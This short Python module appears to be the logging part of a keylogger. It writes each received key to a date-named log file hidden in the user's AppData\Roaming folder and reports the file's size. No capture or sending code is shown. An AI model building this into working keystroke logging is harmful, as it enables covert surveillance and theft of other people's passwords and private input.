import os
import getpass
from datetime import datetime

username = getpass.getuser()

def getlogfilename():
    now = datetime.now()
    now = str(now).split()[0]
    filename = now + ".log"
    return filename
    

def getlogfilepath(filename):
    filepath = os.path.join("C:\\Users", username, "AppData\\Roaming", filename)
    return filepath

def logger(key):
    key = str(key).replace("'", "")
    f = open(getlogfilepath(getlogfilename()), mode="at", encoding="utf-8")
    f.write(key)
    f.close()

def getfilesize():
    filesize = os.path.getsize(getlogfilepath(getlogfilename()))
    return filesize
    
